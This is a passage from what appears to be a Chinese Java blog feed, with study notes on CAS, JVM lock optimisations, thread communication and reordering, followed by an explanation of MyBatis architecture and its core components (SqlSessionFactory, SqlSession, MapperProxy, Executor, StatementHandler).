<p>（2）synchronized 是悲观锁（阻塞锁），悲观地认为程序中的并发情况严重</p>
<p>2、操作过程</p>
<p>3个基本操作数：内存地址V，旧的期望值O，要修改的新值N</p>
<p>更新变量时，但变量的期望值与内存地址V当中的实际值相同时，才会将内存地址V对应的值修改为N</p>
<p>3、CAS的问题</p>
<p>（1）ABA问题</p>
<p>CAS会检查旧值有无变化，比如一个旧值A变为了成B，然后再变成A，刚好在做CAS时检查发现旧值并没有变化依然为A，但是实际上的确发生了变化</p>
<p><strong>解决</strong>：添加一个版本号，原来的变化路径A-&gt;B-&gt;A就变成了1A-&gt;2B-&gt;3C。</p>
<p>（2）自旋时间过长</p>
<p>CAS是非阻塞同步，不会把线程挂起，会自旋进行下一次尝试，自旋时间过长会对性能消耗</p>
<p>（3）只能保证一个共享的原子操作</p>
<p>当对一个共享变量执行操作时CAS能保证其原子性，如果对多个共享变量进行操作,CAS就不能保证其原子性</p>
<p><strong>解决：</strong>用一个对象整合多个共享变量，atomic中提供AtomicReference来保证引用对象之间的原子性</p>
<h4 id="（5）自旋锁"><a href="#（5）自旋锁" class="headerlink" title="（5）自旋锁"></a>（5）自旋锁</h4><p>轻量级锁失败后，虚拟机为了避免线程真实地在操作系统层面挂起，还会进行一项称为自旋锁的优化手段。这是基于在大多数情况下，线程持有锁的时间都不会太长，如果直接挂起操作系统层面的线程可能会得不偿失，毕竟操作系统实现线程之间的切换时需要从用户态转换到核心态，这个状态之间的转换需要相对比较长的时间，时间成本相对较高，因此自旋锁会假设在不久将来，当前的线程可以获得锁，因此虚拟机会让当前想要获取锁的线程做几个空循环(这也是称为自旋的原因)，一般不会太久，可能是50个循环或100循环，在经过若干次循环后，如果得到锁，就顺利进入临界区。如果还不能获得锁，那就会将线程在操作系统层面挂起，这就是自旋锁的优化方式，这种方式确实也是可以提升效率的。最后没办法也就只能升级为重量级锁了。</p>
<h4 id="（6）轻量级锁"><a href="#（6）轻量级锁" class="headerlink" title="（6）轻量级锁"></a>（6）轻量级锁</h4><p>倘若偏向锁失败，虚拟机并不会立即升级为重量级锁，它还会尝试使用一种称为轻量级锁的优化手段(1.6之后加入的)，此时Mark Word 的结构也变为轻量级锁的结构。轻量级锁能够提升程序性能的依据是“对绝大部分的锁，在整个同步周期内都不存在竞争”，注意这是经验数据。需要了解的是，轻量级锁所适应的场景是线程交替执行同步块的场合，如果存在同一时间访问同一锁的场合，就会导致轻量级锁膨胀为重量级锁。</p>
<p><img src="https://csn.damyoung.cn/1113901-20190703154344750-1101311912.png" alt="img"></p>
<h2 id="二、线程通信"><a href="#二、线程通信" class="headerlink" title="二、线程通信"></a>二、线程通信</h2><h3 id="1、通信与同步"><a href="#1、通信与同步" class="headerlink" title="1、通信与同步"></a>1、通信与同步</h3><p>线程通信指线程之间以何种机制来交换信息，两种 <strong>共享内存</strong>和<strong>消息传递</strong></p>
<p>（1）在<strong>共享内存</strong>的并发模型里，线程之间共享程序的公共状态</p>
<p>​        线程之间通过写-读内存中的公共状态来<strong>隐式</strong>进行通信</p>
<p>​        典型的共享内存通信方式就是通过<strong>共享对象进行通信</strong></p>
<p>（2）在<strong>消息传递</strong>的并发模型里，线程之间没有公共状态，</p>
<p>​        线程之间必须通过明确的发送消息来<strong>显式</strong>进行通信</p>
<p>​        在java中典型的消息传递方式就是wait()和notify()</p>
<p><strong>线程同步</strong>是指程序用于控制不同线程之间操作发生相对顺序的机制。</p>
<p>（1）在共享内存并发模型里，同步是显式进行的。</p>
<p>​        程序员必须显式指定某个方法或某段代码需要在线程之间互斥执行。</p>
<p>（2）在消息传递的并发模型里，由于消息的发送必须在消息的接收之前</p>
<p>​        因此同步是隐式进行的。</p>
<p>java内存模型是<strong>共享内存的并发模型</strong>，线程之间主要通过读-写共享变量来完成隐式通信</p>
<h3 id="2、可见性和竞争"><a href="#2、可见性和竞争" class="headerlink" title="2、可见性和竞争"></a>2、可见性和竞争</h3><p>当对象和变量存储到计算机的各个内存区域时，必然会面临一些问题</p>
<ol>
<li>共享对象对各个线程的可见性</li>
<li>共享对象的竞争现象</li>
</ol>
<h4 id="（2）竞争"><a href="#（2）竞争" class="headerlink" title="（2）竞争"></a>（2）竞争</h4><p>如果多个线程共享一个对象，如果它们同时修改这个共享对象，这就产生了竞争现象。</p>
<p>线程A和线程B共享一个对象obj。假设线程A从主存读取Obj.count变量到自己的CPU缓存，同时，线程B也读取了Obj.count变量到它的CPU缓存，并且这两个线程都对Obj.count做了加1操作。此时，Obj.count加1操作被执行了两次，不过都在不同的CPU缓存中。</p>
<p>要解决竞争现象我们可以使用<strong>synchronized</strong>代码块。synchronized代码块可以保证同一个时刻只能有一个线程进入代码竞争区，synchronized代码块也能保证代码块中所有变量都将会从主存中读，当线程退出代码块时，对所有变量的更新将会flush到主存，不管这些变量是不是volatile类型的。</p>
<h3 id="3、重排序"><a href="#3、重排序" class="headerlink" title="3、重排序"></a>3、重排序</h3><p>指令重排序是指编译器和处理器为了提高性能对指令进行重新排序</p>
<ol>
<li>编译器优化重排序：编译器在不改变单线程程序语义的前提下，可以重新安排语句的执行顺序。</li>
<li>指令级并行的重排序：如果不存在数据依赖性，处理器可以改变语句对应机器指令的执行顺序。</li>
<li>内存系统的重排序：处理器使用缓存和读写缓冲区，这使得加载和存储操作看上去可能是在乱序执行。</li>
</ol>
<p>1属于编译器重排序，而2和3统称为处理器重排序。这些重排序会导致线程安全的问题，JMM确保在不同的编译器和不同的处理器平台之上，通过插入特定类型的<code>Memory Barrier</code>来禁止特定类型的编译器重排序和处理器重排序，为上层提供一致的内存可见性保证。</p>
<p><strong>编译器和处理器不会改变存在数据依赖性关系的两个操作的执行顺序，即不会重排序</strong></p>
<p>数据依赖性是指<strong>如果两个操作访问同一个变量，且这两个操作有一个为写操作，此时这两个操作就存在数据依赖性</strong></p>
]]></content>
      <categories>
        <category>javaSe</category>
      </categories>
      <tags>
        <tag>javaSe</tag>
      </tags>
  </entry>
  <entry>
    <title>java MyBatis</title>
    <url>/2021/01/25/javaMyBatis/</url>
    <content><![CDATA[<h1 id="1-MyBatis-有什么特点？"><a href="#1-MyBatis-有什么特点？" class="headerlink" title="1. MyBatis 有什么特点？"></a>1. MyBatis 有什么特点？</h1><ul>
<li>MyBatis 中的 SQL 语句和主要业务代码分离，我们一般会把 MyBatis 中的 SQL 语句统一放在 XML 配置文件中，便于统一维护。</li>
<li>解除 SQL 与程序代码的耦合，通过提供 DAO 层，将业务逻辑和数据访问逻辑分离，使系统的设计更清晰，更易维护，更易单元测试。SQL 和代码的分离，提高了可维护性。</li>
</ul>
<a id="more"></a>

<ul>
<li><p>MyBatis 比较简单和轻量：本身就很小且简单。没有任何第三方依赖，只要通过配置 jar 包，或者如果使用 Maven 项目的话只需要配置 Maven 以来就可以。易于使用，通过文档和源代码，可以比较完全的掌握它的设计思路和实现。</p>
</li>
<li><p>屏蔽样板代码：MyBatis 会屏蔽原始的 JDBC 样板代码，让你把更多的精力专注于 SQL 的书写和属性-字段映射上。</p>
</li>
<li><p>编写原生 SQL，支持多表关联：MyBatis 最主要的特点就是可以手动编写 SQL 语句，能够支持多表关联查询。</p>
</li>
<li><p>提供映射标签，支持对象与数据库的 ORM 字段关系映射</p>
<blockquote>
<p>对象关系映射(Object Relational Mapping，简称ORM) ，是通过使用描述对象和数据库之间映射的元数据，将面向对象语言程序中的对象自动持久化到关系数据库中。本质上就是将数据从一种形式转换到另外一种形式。</p>
</blockquote>
</li>
<li><p>提供 XML 标签，支持编写动态 SQL。可以使用 MyBatis XML 标签，起到 SQL 模版的效果，减少繁杂的 SQL 语句，便于维护。</p>
</li>
</ul>
<h1 id="2-MyBatis-整体架构"><a href="#2-MyBatis-整体架构" class="headerlink" title="2. MyBatis 整体架构"></a>2. MyBatis 整体架构</h1><p>MyBatis <strong>最上面是接口层</strong>，接口层就是开发人员在 Mapper 或者是 Dao 接口中的接口定义，是查询、新增、更新还是删除操作；<strong>中间层是数据处理层</strong>，主要是配置 Mapper -&gt; XML 层级之间的参数映射，SQL 解析，SQL 执行，结果映射的过程。<strong>上述两种流程都由基础支持层来提供功能支撑</strong>，基础支持层包括连接管理，事务管理，配置加载，缓存处理等。</p>
<p><img src="http://qiniu.xiaoming.net.cn/MyBatis%E6%9E%B6%E6%9E%84.png" alt="MyBatis架构"></p>
<h2 id="接口层"><a href="#接口层" class="headerlink" title="接口层"></a>接口层</h2><p>在不与Spring 集成的情况下，使用 MyBatis 执行数据库的操作主要如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">InputStream is = Resources.getResourceAsStream(<span class="string">&quot;myBatis-config.xml&quot;</span>);</span><br><span class="line">SqlSessionFactoryBuilder builder = <span class="keyword">new</span> SqlSessionFactoryBuilder();</span><br><span class="line">SqlSessionFactory factory = builder.build(is);</span><br><span class="line">sqlSession = factory.openSession();</span><br></pre></td></tr></table></figure>

<p>其中的 <code>SqlSessionFactory</code>,<code>SqlSession</code> 是 MyBatis 接口的核心类，尤其是 <code>SqlSession</code>，这个接口是MyBatis 中最重要的接口，这个接口能够执行命令，获取映射，管理事务。</p>
<h2 id="数据处理层"><a href="#数据处理层" class="headerlink" title="数据处理层"></a>数据处理层</h2><h3 id="配置解析"><a href="#配置解析" class="headerlink" title="配置解析"></a>配置解析</h3><p>在 Mybatis 初始化过程中，会加载 <code>mybatis-config.xml</code> 配置文件、映射配置文件以及 Mapper 接口中的注解信息，解析后的配置信息会形成相应的对象并保存到 <code>Configration</code> 对象中。之后，根据该对象创建 <code>SqlSessionFactory</code> 对象。待 Mybatis 初始化完成后，可以通过 <code>SqlSessionFactory</code> 创建 <code>SqlSession</code> 对象并开始数据库操作。</p>
<h3 id="SQL-解析与-scripting-模块"><a href="#SQL-解析与-scripting-模块" class="headerlink" title="SQL 解析与 scripting 模块"></a>SQL 解析与 scripting 模块</h3><p>Mybatis 实现的动态 SQL 语句，几乎可以编写出所有满足需要的 SQL。</p>
<p>Mybatis 中 scripting 模块会根据用户传入的参数，解析映射文件中定义的动态 SQL 节点，形成数据库能执行的 SQL 语句。</p>
<h3 id="SQL-执行"><a href="#SQL-执行" class="headerlink" title="SQL 执行"></a>SQL 执行</h3><p>SQL 语句的执行涉及多个组件，包括 MyBatis 的四大核心，它们是: <code>Executor</code>、<code>StatementHandler</code>、<code>ParameterHandler</code>、<code>ResultSetHandler</code>。SQL 的执行过程可以用下面这幅图来表示：</p>
<p><img src="http://qiniu.xiaoming.net.cn/mybatis%E4%B8%ADsql%E6%89%A7%E8%A1%8C%E8%BF%87%E7%A8%8B.jpg" alt="MyBatis中sql执行过程"></p>
<p>MyBatis 层级结构各个组件的介绍(这里只是简单介绍，具体介绍在后面)：</p>
<ul>
<li><code>SqlSession</code>：它是 MyBatis 核心 API，主要用来执行命令，获取映射，管理事务。接收开发人员提供 Statement Id 和参数。并返回操作结果。</li>
<li><code>Executor</code> ：执行器，是 MyBatis 调度的核心，负责 SQL 语句的生成以及查询缓存的维护。</li>
<li><code>StatementHandler</code> : 封装了 JDBC Statement 操作，负责对 JDBC Statement 的操作，如设置参数、将 Statement 结果集转换成 List 集合。</li>
<li><code>ParameterHandler</code> : 负责对用户传递的参数转换成 JDBC Statement 所需要的参数。</li>
<li><code>ResultSetHandler</code> : 负责将 JDBC 返回的 ResultSet 结果集对象转换成 List 类型的集合。</li>
<li><code>TypeHandler</code> : 用于 Java 类型和 JDBC 类型之间的转换。</li>
<li><code>MappedStatement</code> : 动态 SQL 的封装</li>
<li><code>SqlSource</code> : 表示从 XML 文件或注释读取的映射语句的内容，它创建将从用户接收的输入参数传递给数据库的 SQL。</li>
<li><code>Configuration</code> : MyBatis 所有的配置信息都维持在 <code>Configuration</code> 对象之中。</li>
</ul>
<h2 id="基础支持层"><a href="#基础支持层" class="headerlink" title="基础支持层"></a>基础支持层</h2><h3 id="反射模块"><a href="#反射模块" class="headerlink" title="反射模块"></a>反射模块</h3><p>Mybatis 中的反射模块，对 Java 反射进行了很好的封装，提供了简易的 API，方便上层调用，并且对反射操作进行了一系列的优化，比如，缓存了类的元数据（MetaClass）和对象的元数据（MetaObject），提高了反射操作的性能。</p>
<h3 id="类型转换模块"><a href="#类型转换模块" class="headerlink" title="类型转换模块"></a>类型转换模块</h3><p>Mybatis 的别名机制，能够简化配置文件，该机制是类型转换模块的主要功能之一。类型转换模块的另一个功能是实现 JDBC 类型与 Java 类型的转换。在 SQL 语句绑定参数时，会将数据由 Java 类型转换成 JDBC 类型；在映射结果集时，会将数据由 JDBC 类型转换成 Java 类型。</p>
<h3 id="日志模块"><a href="#日志模块" class="headerlink" title="日志模块"></a>日志模块</h3><p>在 Java 中，有很多优秀的日志框架，如 Log4j、Log4j2、slf4j 等。Mybatis 除了提供了详细的日志输出信息，还能够集成多种日志框架，其日志模块的主要功能就是集成第三方日志框架。</p>
<h3 id="资源加载模块"><a href="#资源加载模块" class="headerlink" title="资源加载模块"></a>资源加载模块</h3><p>该模块主要封装了类加载器，确定了类加载器的使用顺序，并提供了加载类文件和其它资源文件的功能。</p>
<h3 id="解析器模块"><a href="#解析器模块" class="headerlink" title="解析器模块"></a>解析器模块</h3><p>该模块有两个主要功能：一个是封装了 XPath，为 Mybatis 初始化时解析 <code>mybatis-config.xml</code> 配置文件以及映射配置文件提供支持；另一个为处理动态 SQL 语句中的占位符提供支持。</p>
<h3 id="数据源模块"><a href="#数据源模块" class="headerlink" title="数据源模块"></a>数据源模块</h3><p>Mybatis 自身提供了相应的数据源实现，也提供了与第三方数据源集成的接口。数据源是开发中的常用组件之一，很多开源的数据源都提供了丰富的功能，如连接池、检测连接状态等，选择性能优秀的数据源组件，对于提供 ORM 框架以及整个应用的性能都是非常重要的。</p>
<h3 id="事务管理模块"><a href="#事务管理模块" class="headerlink" title="事务管理模块"></a>事务管理模块</h3><p>一般地，Mybatis 与 Spring 框架集成，由 Spring 框架管理事务。但 Mybatis 自身对数据库事务进行了抽象，提供了相应的事务接口和简单实现。</p>
<h3 id="缓存模块"><a href="#缓存模块" class="headerlink" title="缓存模块"></a>缓存模块</h3><p>Mybatis 中有一级缓存和二级缓存，这两级缓存都依赖于缓存模块中的实现。但是需要注意，这两级缓存与Mybatis 以及整个应用是运行在同一个 JVM 中的，共享同一块内存，如果这两级缓存中的数据量较大，则可能影响系统中其它功能，所以需要缓存大量数据时，优先考虑使用 Redis、Memcache 等缓存产品。</p>
<h3 id="Binding-模块"><a href="#Binding-模块" class="headerlink" title="Binding 模块"></a>Binding 模块</h3><p>在调用 SqlSession 相应方法执行数据库操作时，需要制定映射文件中定义的 SQL 节点，如果 SQL 中出现了拼写错误，那就只能在运行时才能发现。为了能尽早发现这种错误，Mybatis 通过 Binding 模块将用户自定义的 Mapper 接口与映射文件关联起来，系统可以通过调用自定义 Mapper 接口中的方法执行相应的 SQL 语句完成数据库操作，从而避免上述问题。注意，在开发中，我们只是创建了 Mapper 接口，而并没有编写实现类，这是因为 Mybatis 自动为 Mapper 接口创建了动态代理对象。</p>
<h1 id="3-Mybatis核心组件-Mybatis中SQL语句执行过程"><a href="#3-Mybatis核心组件-Mybatis中SQL语句执行过程" class="headerlink" title="3. Mybatis核心组件(Mybatis中SQL语句执行过程)"></a>3. Mybatis核心组件(Mybatis中SQL语句执行过程)</h1><p>这些组件实现了从 SQL 语句到映射到 JDBC 再到数据库字段之间的转换，执行 SQL 语句并输出结果集。</p>
<h2 id="SqlSessionFactory"><a href="#SqlSessionFactory" class="headerlink" title="SqlSessionFactory"></a>SqlSessionFactory</h2><p>对于任何框架而言，在使用该框架之前都要经历过一系列的初始化流程，MyBatis 也不例外。MyBatis 的初始化流程如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String resource = <span class="string">&quot;org/mybatis/example/mybatis-config.xml&quot;</span>;</span><br><span class="line">InputStream inputStream = Resources.getResourceAsStream(resource);</span><br><span class="line">SqlSessionFactory sqlSessionFactory = <span class="keyword">new</span> SqlSessionFactoryBuilder().build(inputStream);</span><br><span class="line">sqlSessionFactory.openSession();</span><br></pre></td></tr></table></figure>

<p>上述流程中比较重要的一个对象就是 <code>SqlSessionFactory</code>，<code>SqlSessionFactory</code> 是 MyBatis 框架中的一个接口，它主要负责的是</p>
<ul>
<li>MyBatis 框架初始化操作</li>
<li>为开发人员提供SqlSession 对象</li>
</ul>
<p><img src="http://qiniu.xiaoming.net.cn/MyBatis%E4%B8%ADsqlsessionFactory.jpg" alt="MyBatis中sqlSessionFactory类"></p>
<p><code>SqlSessionFactory</code> 有两个实现类，一个是 <code>SqlSessionManager</code> 类，一个是 <code>DefaultSqlSessionFactory</code> 类</p>
<ul>
<li><code>DefaultSqlSessionFactory</code> : SqlSessionFactory 的默认实现类，是真正生产会话的工厂类，这个类的实例的生命周期是全局的，它只会在首次调用时生成一个实例（单例模式），就一直存在直到服务器关闭。</li>
<li><code>SqlSessionManager</code> ：已被废弃，原因大概是: SqlSessionManager 中需要维护一个自己的线程池，而使用 MyBatis 更多的是要与 Spring 进行集成，并不会单独使用，所以维护自己的 ThreadLocal 并没有什么意义，所以 SqlSessionManager 已经不再使用。</li>
</ul>
<h3 id="SqlSessionFactory-的执行流程"><a href="#SqlSessionFactory-的执行流程" class="headerlink" title="SqlSessionFactory 的执行流程"></a>SqlSessionFactory 的执行流程</h3><p>首先第一步是 SqlSessionFactory 的创建</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SqlSessionFactory sqlSessionFactory &#x3D; new SqlSessionFactoryBuilder().build(inputStream);</span><br></pre></td></tr></table></figure>

<p>从这行代码入手，首先创建了一个 <code>SqlSessionFactoryBuilder</code> 工厂，这是一个建造者模式的设计思想，由 <code>builder</code> 建造者来创建 <code>SqlSessionFactory</code> 工厂</p>
<p>然后调用 <code>SqlSessionFactoryBuilder</code> 中的 <code>build</code> 方法传递一个 <code>InputStream</code> 输入流，Inputstream 输入流中就是你传过来的配置文件 <code>mybatis-config.xml</code>，<code>SqlSessionFactoryBuilder</code> 根据传入的 <code>InputStream</code> 输入流和 <code>environment</code>、<code>properties</code> 属性创建一个 <code>XMLConfigBuilder</code> 对象。<code>SqlSessionFactoryBuilder</code> 对象调用 <code>XMLConfigBuilder</code> 的 <code>parse()</code> 方法，流程如下。</p>
<p><img src="http://qiniu.xiaoming.net.cn/SqlSessionFactory%20%E7%9A%84%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B.jpg" alt="SqlSessionFactory 的执行流程"></p>
<p>XMLConfigBuilder 会解析 <code>/configuration</code> 标签，<code>configuration</code> 是 MyBatis 中最重要的一个标签。</p>
<p><img src="http://qiniu.xiaoming.net.cn/parseConfiguration%E6%96%B9%E6%B3%95.jpg" alt="parseConfiguration方法"></p>
<p>每一个属性都对应着一个解析方法，都是使用 XPath 把标签进行解析，解析完成后返回一个 <code>DefaultSqlSessionFactory</code> 对象，它是 <code>SqlSessionFactory</code> 的默认实现类。这就是 <code>SqlSessionFactoryBuilder</code> 的初始化流程，通过流程我们可以看到，初始化流程就是对一个个 <code>/configuration</code> 标签下子标签的解析过程。</p>
<h2 id="SqlSession"><a href="#SqlSession" class="headerlink" title="SqlSession"></a>SqlSession</h2><p>在 MyBatis 初始化流程结束，也就是 SqlSessionFactoryBuilder -&gt; SqlSessionFactory 的获取流程后，我们就可以通过 SqlSessionFactory 对象得到 SqlSession 然后执行 SQL 语句了。</p>
<p><img src="http://qiniu.xiaoming.net.cn/sqlSessionFactory%E8%8E%B7%E5%8F%96sqlsession%E6%B5%81%E7%A8%8B.jpg" alt="sqlSessionFactory获取sqlSession流程"></p>
<p>在 <code>SqlSessionFactory.openSession</code> 过程中我们可以看到，会调用到 <code>DefaultSqlSessionFactory</code> 中的 <code>openSessionFromDataSource</code> 方法，这个方法主要创建了两个与分析执行流程重要的对象，一个是 <code>Executor</code> 执行器对象，一个是 <code>SqlSession</code> 对象。</p>
<p><code>SqlSession</code> 对象是 MyBatis 中最重要的一个对象，这个接口能够执行命令，获取映射，管理事务。<code>SqlSession</code> 中定义了一系列模版方法，让你能够执行简单的 CRUD 操作，也可以通过 getMapper 获取 Mapper 层，执行自定义 SQL 语句，因为 SqlSession 在执行 SQL 语句之前是需要先开启一个会话，涉及到事务操作，所以还会有 commit、 rollback、close 等方法。这也是模版设计模式的一种应用。</p>
<h2 id="MapperProxy"><a href="#MapperProxy" class="headerlink" title="MapperProxy"></a>MapperProxy</h2><p><code>MapperProxy</code> 是 Mapper 映射 SQL 语句的关键对象，我们写的 Dao 层或者 Mapper 层都是通过 MapperProxy 来和对应的 SQL 语句进行绑定的。绑定过程如下：</p>
<p><img src="http://qiniu.xiaoming.net.cn/MapperProxy%E7%BB%91%E5%AE%9A%E8%BF%87%E7%A8%8B.jpg" alt="MapperProxy绑定过程"></p>
<p>这就是 MyBatis 的核心绑定流程，可以看到 <code>SqlSession</code> 首先调用 <code>getMapper</code> 方法， SqlSession 是大哥级别的人物，只定义标准。</p>
<p>SqlSession 把事情交给 <code>Configuration</code> 去做，然后 <code>Configuration</code> 有调用 <code>MapperRegistry</code>。<code>MapperRegistry</code> 相当于项目经理，项目经理只从大面上把握项目进度，不需要知道手下的小弟是如何工作的，把任务完成了就好。最终真正干活的还是 <code>MapperProxyFactory</code>。通过这段代码 <code>Proxy.newProxyInstance</code> ，可以看出使用了动态代理。</p>
<p>也就是说，MyBatis 中 Mapper 和 SQL 语句的绑定正是通过动态代理来完成的。</p>
<p>通过动态代理，就可以方便的在 Dao 层或者 Mapper 层定义接口，实现自定义的增删改查操作了。</p>
<p>接下来再看看 sql 语句执行过程</p>
<p><img src="http://qiniu.xiaoming.net.cn/MapperProxy%E4%B8%ADsql%E8%AF%AD%E5%8F%A5%E6%89%A7%E8%A1%8C%E8%BF%87%E7%A8%8B.jpg" alt="MapperProxy中sql语句执行过程"></p>
<p><code>MapperProxyFactory</code> 会生成代理对象，这个对象就是 <code>MapperProxy</code>，最终会调用到 <code>mapperMethod.execute</code> 方法，execute 方法比较长，其实逻辑比较简单，就是判断是插入、更新、删除还是查询语句，其中如果是查询的话，还会判断返回值的类型:</p>
<p><img src="http://qiniu.xiaoming.net.cn/mapperMethod.execute%E6%96%B9%E6%B3%95.jpg" alt="mapperMethod.execute方法"></p>
<p>以 selectList 为例，来看一下下面的执行过程。</p>
<p><img src="http://qiniu.xiaoming.net.cn/mapperMethod%E4%B8%ADselectList%E6%BA%90%E7%A0%81.jpg" alt="DefaultSqlSession中selectList源码"></p>
<p>这是 <code>DefaultSqlSession</code> 中 <code>selectList</code> 的代码，可以看到出现了 <code>executor</code>。</p>
<h2 id="Executor"><a href="#Executor" class="headerlink" title="Executor"></a>Executor</h2><p>Executor 的创建如下：由 Configuration 对象创建了一个 Executor 对象</p>
<p><img src="http://qiniu.xiaoming.net.cn/Executor%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%87%BA%E7%8E%B0%E7%9A%84%E4%BD%8D%E7%BD%AE.jpg" alt="Executor创建"></p>
<h3 id="Executor-的继承结构"><a href="#Executor-的继承结构" class="headerlink" title="Executor 的继承结构"></a>Executor 的继承结构</h3><p>每一个 SqlSession 都会拥有一个 Executor 对象，这个对象负责增删改查的具体操作，可以简单的将它理解为 JDBC 中 Statement 的封装版。也可以理解为 SQL 的执行引擎，要干活总得有一个发起人吧，可以把 Executor 理解为发起人的角色。</p>
<p>Executor 的继承体系如下：</p>
<p><img src="http://qiniu.xiaoming.net.cn/Executor%E7%9A%84%E7%BB%A7%E6%89%BF%E7%BB%93%E6%9E%84.jpg" alt="Executor继承结构"></p>
<p>如上图所示，位于继承体系最顶层的是 Executor 执行器，它有两个实现类，分别是 <code>BaseExecutor</code> 和 <code>CachingExecutor</code>。</p>
<p><code>BaseExecutor</code> 是一个抽象类，这种通过抽象的实现接口的方式是适配器设计模式之接口适配的体现，是Executor 的默认实现，实现了大部分 Executor 接口定义的功能，降低了接口实现的难度。<code>BaseExecutor</code> 的子类有三个，分别是 <code>SimpleExecutor</code>、<code>ReuseExecutor</code> 和 <code>BatchExecutor</code>。</p>
<ul>
<li><code>SimpleExecutor</code> : 简单执行器，是 MyBatis 中默认使用的执行器，每执行一次 update 或 select，就开启一个Statement 对象，用完就直接关闭 Statement 对象(可以是 Statement 或者是 PreparedStatment 对象)</li>
<li><code>ReuseExecutor</code> : 可重用执行器，这里的重用指的是重复使用 Statement，它会在内部使用一个 Map 把创建的 Statement 都缓存起来，每次执行 SQL 命令的时候，都会去判断是否存在基于该 SQL 的 Statement 对象，如果存在 Statement 对象并且对应的 connection 还没有关闭的情况下就继续使用之前的 Statement 对象，并将其缓存起来。因为每一个 SqlSession 都有一个新的 Executor 对象，所以我们缓存在 ReuseExecutor 上的 Statement 作用域是同一个 SqlSession。</li>
<li><code>BatchExecutor</code> : 批处理执行器，用于将多个 SQL 一次性输出到数据库</li>
<li><code>CachingExecutor</code> : 缓存执行器，先从缓存中查询结果，如果存在就返回之前的结果；如果不存在，再委托给 Executor delegate 去数据库中取，delegate 可以是上面任何一个执行器。</li>
</ul>
<h3 id="Executor的创建和选择"><a href="#Executor的创建和选择" class="headerlink" title="Executor的创建和选择"></a>Executor的创建和选择</h3><p>Executor 是由 Configuration 创建的，Configuration 会根据执行器的类型创建，如下：</p>
<p><img src="http://qiniu.xiaoming.net.cn/Executor%E7%9A%84%E5%88%9B%E5%BB%BA%E5%92%8C%E9%80%89%E6%8B%A9.jpg" alt="Executor的创建和选择"></p>
<p>这一步就是执行器的创建过程，根据传入的 <code>ExecutorType</code> 类型来判断是哪种执行器，如果不指定 <code>ExecutorType</code> ，默认创建的是简单执行器。它的赋值可以通过两个地方进行赋值：</p>
<p>可以通过标签来设置当前工程中所有的 SqlSession 对象使用默认的 Executor:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">settings</span>&gt;</span></span><br><span class="line"> <span class="comment">&lt;!--取值范围 SIMPLE, REUSE, BATCH --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;defaultExecutorType&quot;</span> <span class="attr">value</span>=<span class="string">&quot;SIMPLE&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">settings</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>另外一种直接通过Java对方法赋值的方式:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">session = factory.openSession(ExecutorType.BATCH);</span><br></pre></td></tr></table></figure>

<h3 id="Executor-的具体执行过程"><a href="#Executor-的具体执行过程" class="headerlink" title="Executor 的具体执行过程"></a>Executor 的具体执行过程</h3><p>Executor 中的大部分方法的调用链其实是差不多的，执行流程图如下：</p>
<p><img src="http://qiniu.xiaoming.net.cn/Executor%20%E7%9A%84%E5%85%B7%E4%BD%93%E6%89%A7%E8%A1%8C%E8%BF%87%E7%A8%8B.jpg" alt="Executor的具体执行过程"></p>
<p>紧跟着上面的 selectList 继续分析，它会调用到 <code>executor.query</code> 方法。</p>
<p>当有一个查询请求访问的时候，首先会经过 Executor 的实现类 <code>CachingExecutor</code> ，先从缓存中查询 SQL 是否是第一次执行，如果是第一次执行的话，那么就直接执行 SQL 语句，并创建缓存，如果第二次访问相同的 SQL 语句的话，那么就会直接从缓存中提取。</p>
<p>下面这段代码是从 <code>selectList -&gt; 从缓存中 query</code> 的具体过程。</p>
<p><img src="http://qiniu.xiaoming.net.cn/Executor%E5%85%B7%E4%BD%93%E6%89%A7%E8%A1%8C%E8%BF%87%E7%A8%8B2.jpg" alt="Executor具体执行过程2-从缓存获取"></p>
<p>下面代码会判断缓存中是否有这条 SQL 语句的执行结果，如果没有的话，就再重新创建 Executor 执行器执行 SQL 语句，注意， <code>list = doQuery</code> 是真正执行 SQL 语句的过程，这个过程中会创建我们上面提到的三种执行器，这里我们使用的是简单执行器。</p>
<p><img src="http://qiniu.xiaoming.net.cn/Executor%E5%85%B7%E4%BD%93%E6%89%A7%E8%A1%8C%E8%BF%87%E7%A8%8B2-%E7%9B%B4%E6%8E%A5%E6%89%A7%E8%A1%8Csql%E8%AF%AD%E5%8F%A5.jpg" alt="Executor具体执行过程2-直接执行sql语句"></p>
<p>到这里，执行器所做的工作就完事了，Executor 会把后续的工作交给 StatementHandler 继续执行。</p>
<h2 id="StatementHandler"><a href="#StatementHandler" class="headerlink" title="StatementHandler"></a>StatementHandler</h2><p><code>StatementHandler</code> 是四大组件中最重要的一个对象，负责操作 Statement 对象与数据库进行交互，在工作时还会使用 <code>ParameterHandler</code> 和 <code>ResultSetHandler</code> 对参数进行映射，对结果进行实体类的绑定，这两个组件我们后面说。</p>
<p>在搭建原生 JDBC 的时候，会有这样一行代码:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Statement stmt = conn.createStatement(); <span class="comment">//也可以使用PreparedStatement来做</span></span><br></pre></td></tr></table></figure>

<p>这行代码创建的 <code>Statement</code> 对象或者是 <code>PreparedStatement</code> 对象就是由 <code>StatementHandler</code> 进行管理的。</p>
<h3 id="StatementHandler-的继承结构"><a href="#StatementHandler-的继承结构" class="headerlink" title="StatementHandler 的继承结构"></a>StatementHandler 的继承结构</h3><p><img src="http://qiniu.xiaoming.net.cn/StatementHandler%E7%9A%84%E7%BB%A7%E6%89%BF%E7%BB%93%E6%9E%84.jpg" alt="StatementHandler 的继承结构"></p>
<p>有没有感觉和 Executor 的继承体系很相似呢？最顶级接口是四大组件对象，分别有两个实现类 <code>BaseStatementHandler</code> 和 <code>RoutingStatementHandler</code>，<code>BaseStatementHandler</code> 有三个实现类, 他们分别是 <code>SimpleStatementHandler</code>、<code>PreparedStatementHandler</code> 和 <code>CallableStatementHandler</code>。</p>
